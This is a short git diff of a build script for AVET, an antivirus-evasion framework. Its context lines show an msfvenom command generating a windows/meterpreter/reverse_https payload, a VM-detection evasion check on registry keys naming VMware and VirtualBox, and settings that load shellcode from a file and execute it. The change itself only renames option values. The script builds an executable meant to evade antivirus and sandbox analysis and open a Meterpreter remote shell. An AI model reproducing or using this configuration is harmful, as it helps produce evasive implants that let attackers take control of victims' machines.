@@ -26,8 +26,8 @@ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/s
 add_evasion has_vm_regkey 'VMWARE,VBOX,VIRTUAL,VMware'
 
 # no command preexec
-set_command_source none
-set_command_exec none
+set_command_source no_data
+set_command_exec no_command
 
 # set shellcode source
 set_payload_source static_from_file input/sc_c.txt
@@ -35,10 +35,10 @@ set_payload_source static_from_file input/sc_c.txt
 # set decoder and key source
 # AVET decoder needs no key
 set_decoder none
-set_key_source none
+set_key_source no_data
 
 # set payload info source
-set_payload_info_source none
+set_payload_info_source no_data
 
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode
